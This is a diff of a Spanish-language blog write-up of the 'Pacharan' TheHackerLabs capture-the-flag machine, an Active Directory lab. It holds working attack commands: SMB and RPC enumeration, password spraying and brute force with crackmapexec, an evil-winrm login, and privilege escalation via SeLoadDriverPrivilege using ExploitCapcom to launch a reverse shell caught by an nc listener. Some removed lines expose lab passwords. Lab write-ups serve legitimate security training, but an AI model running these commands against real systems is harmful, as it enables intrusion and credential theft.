@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Pacharan - TheHackerLabs
-excerpt: "."
+excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, descubrimos que estamos ante un Active Directory (AD) y asumimos que no podemos hacer nada más que comenzar a enumerar usuarios al servicio Kerberos, esto para encontrar usuarios válidos que puedan ser utilizados para enumerar el servicio SMB. Encontrando un usuario válido, podemos enumerar los recursos compartidos del SMB en donde encontramos una contraseña de otro usuario. Aplicando Password Spraying, descubrimos a quién le pertenece esta contraseña. Usamos esas nuevas credenciales para volver a enumerar los recursos compartidos del SMB, encontrando otro archivo que contiene una lista de contraseñas. Aplicando Fuerza Bruta con crackmapexec, descubrimos a un usuario con una contraseña válida de la lista. Con estas nuevas credenciales, enumeramos el servicio RPC, en donde encontramos una contraseña en texto claro al mostrar la información de las impresoras activas. Usamos esa contraseña para aplicar Password Spraying a todos los usuarios del AD, descubriendo a quien le pertenece. Usamos estas nuevas credenciales para entrar el servicio WinRM con la herramienta evil-winrm. Por último, dentro de la máquina vemos que tenemos el permiso SeLoadDriverPrivilege, del cual nos podemos aprovechar para poder escalar privilegios."
 date: 2025-02-24
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-pacharan/_logo.png
+  teaser: /assets/images/THL-writeup-pacharan/pacharan.jpg
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -25,9 +25,9 @@ tags:
   - Privesc - Abusing SeLoadDriverPrivilege Privilege
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-pacharan/_logo.png)
+![](/assets/images/THL-writeup-pacharan/pacharan.jpg)
 
-texto
+Esta fue una máquina algo complicada. Después de analizar los escaneos, descubrimos que estamos ante un **Active Directory (AD)** y asumimos que no podemos hacer nada más que comenzar a enumerar usuarios al **servicio Kerberos**, esto para encontrar usuarios válidos que puedan ser utilizados para enumerar el **servicio SMB**. Encontrando un usuario válido, podemos enumerar los **recursos compartidos del SMB** en donde encontramos una contraseña de otro usuario. Aplicando **Password Spraying**, descubrimos a quién le pertenece esta contraseña. Usamos esas nuevas credenciales para volver a enumerar los **recursos compartidos del SMB**, encontrando otro archivo que contiene una lista de contraseñas. Aplicando **Fuerza Bruta con crackmapexec**, descubrimos a un usuario con una contraseña válida de la lista. Con estas nuevas credenciales, enumeramos el **servicio RPC**, en donde encontramos una contraseña en texto claro al mostrar la información de las impresoras activas. Usamos esa contraseña para aplicar **Password Spraying** a todos los usuarios del **AD**, descubriendo a quien le pertenece. Usamos estas nuevas credenciales para entrar el **servicio WinRM** con la herramienta **evil-winrm**. Por último, dentro de la máquina vemos que tenemos el permiso **SeLoadDriverPrivilege**, del cual nos podemos aprovechar para poder escalar privilegios.
 
 Herramientas utilizadas:
 * *ping*
@@ -51,6 +51,7 @@ Herramientas utilizadas:
 	<ul>
 		<li><a href="#Recopilacion">Recopilación de Información</a></li>
 			<ul>
+				<li><a href="#Hosts">Descubrimiento de Hosts</a></li>
 				<li><a href="#Ping">Traza ICMP</a></li>
 				<li><a href="#Puertos">Escaneo de Puertos</a></li>
 				<li><a href="#Servicios">Escaneo de Servicios</a></li>
@@ -281,7 +282,7 @@ Nmap done: 1 IP address (1 host up) scanned in 69.43 seconds
 | *-p*       | Para indicar puertos específicos. |
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
-Bien, confirmamos que estamos contra un **AD** y podemos ver que el **servicio SMB** parece necesitar credenciales para poder entrar. Además, parece que hubo un problema para escanear el **puerto 53** que pertenece al **servicio DNS**. Por lo que yo empezaria por el **puerto 88** que es **servicio Kerberos**.
+Bien, confirmamos que estamos contra un **AD** y podemos ver que el **servicio SMB** parece necesitar credenciales para poder entrar. Además, parece que hubo un problema para escanear el **puerto 53** que pertenece al **servicio DNS**. Por lo que yo empezaría por el **puerto 88** que es **servicio Kerberos**.
 
 También pudimos ver el dominio del **AD**, este lo puedes registrar en el `/etc/hosts` quedando de la siguiente manera:
 ```bash
@@ -334,7 +335,7 @@ Encontramos varios usuarios. Te recomiendo que los guardes en un archivo de text
 
 Podríamos probar con cualquiera, pero el único que nos va a funcionar es el **usuario invitado**.
 
-Comprobemoslo con **smbmap**:
+Comprobémoslo con **smbmap**:
 ```bash
 smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado'
 
@@ -380,10 +381,11 @@ Antes que nada, podemos comprobar que este servicio necesita credenciales para p
 crackmapexec smb 192.168.69.69
 SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
 ```
+Ahí nos dice que esta activado el login.
 
 Ya vimos que el **usuario invitado** puede ver el contenido del **directorio NETLOGON2**.
 
-Veamos que hay dentro:
+Veamos qué hay dentro:
 ```bash
 smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado' -r NETLOGON2
     ________  ___      ___  _______   ___      ___       __         _______
@@ -421,7 +423,6 @@ Hay un archivo de texto.
 Vamos a descargarlo:
 ```bash
 smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado' --download NETLOGON2/Orujo.txt
-
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
@@ -440,14 +441,14 @@ SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Closed 1 connections
 ```
 
-Veamos que contiene este archivo
+Veamos que contiene este archivo:
 ```bash
 cat 192.168.69.69-NETLOGON2_Orujo.txt
 Pericodelospalotes6969
 ```
 Parece ser una contraseña.
 
-Podríamos comprobar si está contraseña es de algún usuario que ya tenemos.  
+Podríamos comprobar si esta contraseña es de algún usuario que ya tenemos.  
 
 Podemos aplicar **password spraying** con **crackmapexec**:
 ```bash
@@ -476,7 +477,6 @@ En efecto, es un usuario.
 Veamos que puede ver este usuario:
 ```bash
 smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969'
-
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
@@ -510,7 +510,6 @@ Parece que podemos ver el **directorio PACHARAN**.
 Veamos su contenido:
 ```bash
 smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969' -r PACHARAN
-
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
@@ -547,7 +546,6 @@ Parece ser otro archivo de texto.
 Vamos a descargarlo:
 ```bash
 smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969' --download PACHARAN/ah.txt
-
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
@@ -611,8 +609,8 @@ Por lo que podemos continuar con otro servicio.
 Lo siguiente que podemos hacer, es ver si podemos enumerar el **servicio RPC**.
 
 Esto lo haremos con el último usuario y contraseña que encontramos, utilizando la herramienta **rpcclient**:
-```bash
-rpcclient -U "whisky%MamasoyStream2er@" 192.168.69.69
+```batch
+rpcclient -U "whisky%*********" 192.168.69.69
 rpcclient $> enumdomusers
 user:[Administrador] rid:[0x1f4]
 user:[Invitado] rid:[0x1f5]
@@ -631,10 +629,10 @@ user:[CarlosV] rid:[0x45b]
 user:[RedLabel] rid:[0x45c]
 user:[Gordons] rid:[0x45d]
 ```
-Bien, entramos y funcionan los comandos que usemos.
+Bien, entramos y funcionan los comandos que usemos. Aquí ya usamos el comando **enumdomusers** para obtener todos los usuarios registrados.
 
 Veamos si podemos obtener alguna contraseña al revisar la descripción de los usuarios con el comando **querydispinfo**:
-```bash
+```batch
 rpcclient $> querydispinfo
 index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrador	Name: (null)	Desc: Cuenta integrada para la administración del equipo o dominio
 index: 0x109c RID: 0x45a acb: 0x00020010 Account: beefeater	Name: Beefeater	Desc: (null)
@@ -658,7 +656,7 @@ Nada, no hay algo que nos ayude.
 Revisando los recursos compartidos del **servicio SMB**, recordemos que hay un recurso llamado `PDF Pro Virtual Printer` y que tiene una descripción curiosa.
 
 Se da a entender que hay una impresora conectada y esta la podemos ver desde el **servicio RPC** con el comando **enumprinters**:
-```bash
+```batch
 rpcclient $> enumprinters
 	flags:[0x800000]
 	name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
@@ -667,11 +665,11 @@ rpcclient $> enumprinters
 ```
 Parece que hay una contraseña en la descripción de la impresora.
 
-Podemos probar si le pertenece a algún usuario, pero me doy cuenta de que hay algunos usuarios que no teniamos registrados.
+Podemos probar si le pertenece a algún usuario, pero me doy cuenta de que hay algunos usuarios que no teníamos registrados.
 
 Es posible obtener todos los usuarios con el siguiente comando:
-```bash
-rpcclient -U "whisky%MamasoyStream2er@" 192.168.69.69 -c "enumdomusers" | awk -F '[][]' '{print $2}'
+```batch
+rpcclient -U "whisky%************" 192.168.69.69 -c "enumdomusers" | awk -F '[][]' '{print $2}'
 Administrador
 Invitado
 krbtgt
@@ -714,34 +712,28 @@ WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Rega
 ```
 Funciono.
 
-Vamos a conectarnos con la heramienta **evil-winrm**:
-```
-evil-winrm -i 192.168.69.69 -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'
+Vamos a conectarnos con la herramienta **evil-winrm**:
+```batch
+evil-winrm -i 192.168.69.69 -u 'Chivas Regal' -p '**************'
                                         
 Evil-WinRM shell v3.7
-                                        
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion       
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Chivas Regal\Documents>
 ```
 Y estamos dentro.
 
 Aquí podemos encontrar la flag del usuario:
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\Chivas Regal\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> dir
 
-
     Directorio: C:\Users\Chivas Regal\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----         8/1/2024  10:29 AM             36 user.txt
-
 
 *Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> type user.txt
 ....
@@ -759,7 +751,7 @@ Mode                LastWriteTime         Length Name
 
 <h2 id="Privesc">Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios</h2>
 
-Investigando un poco, existe la posibilidad de utilizar el privilegio SeLoadDriverPrivilege para escalar privilegios. En el siguiente blog se explica bastante bien el como se hace esto:
+Investigando un poco, existe la posibilidad de utilizar el **privilegio SeLoadDriverPrivilege** para escalar privilegios. En el siguiente blog se explica bastante bien el cómo se hace esto:
 * <a href="https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/" target="_blank">Abusando SeLoadDriverPrivilege para elevar privilegios</a>
 
 En resumen, este privilegio permite la carga de controladores de kernel maliciosos, pues permite a un usuario con privilegios limitados cargar y administrar controladores del kernel (drivers). 
@@ -795,7 +787,7 @@ Final size of exe file: 7168 bytes
 Saved as: revShell.exe
 ```
 
-Con esto listo, vamos a cargar todos los archivos, que en total serían 4, a nuestra sesión de **evil-winrm**:
+Con esto listo, vamos a cargar todos los archivos, que en total serían 4, a nuestra sesión de **evil-winrm** con el comando **upload**:
 ```batch
 *Evil-WinRM* PS C:\> mkdir Temp
 *Evil-WinRM* PS C:\> cd Temp
@@ -837,7 +829,7 @@ rlwrap nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-Por último, ejecutamos el binario **ExploitCapcom.exe** indicandole que ejecute nuestra **Reverse Shell**:
+Por último, ejecutamos el binario **ExploitCapcom.exe** indicándole que ejecute nuestra **Reverse Shell**:
 ```batch
 *Evil-WinRM* PS C:\Temp> .\ExploitCapcom.exe C:\Temp\revShell.exe
 [+] Path is: C:\Temp\revShell.exe
@@ -888,6 +880,7 @@ Con esto completamos la máquina.
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
